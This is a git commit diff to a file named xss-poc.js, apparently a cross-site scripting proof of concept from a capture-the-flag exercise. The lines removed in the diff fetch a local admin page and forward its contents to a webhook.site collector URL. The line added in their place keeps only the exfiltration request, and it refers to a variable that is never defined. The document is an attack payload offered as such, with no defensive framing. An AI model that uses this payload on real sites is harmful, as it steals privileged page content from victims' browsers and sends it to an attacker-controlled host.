c3fa6a46118c3d04286214ef2a70cdca9a7d2acc
0xdiego <93290842+diegojoel301@users.noreply.github.com>
2024-02-28 20:38:50 +0100

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,5 +1,2 @@
-fetch("http://127.0.0.1:1337/admin").then((res) => {
-	return res.text();
-}).then(data => {
-	fetch("https://webhook.site/18c8bcc4-bed9-473d-9f49-f22ec3133adb/a.png?data="+data);
-})
+fetch("https://webhook.site/18c8bcc4-bed9-473d-9f49-f22ec3133adb/a.png?data="+data);
+
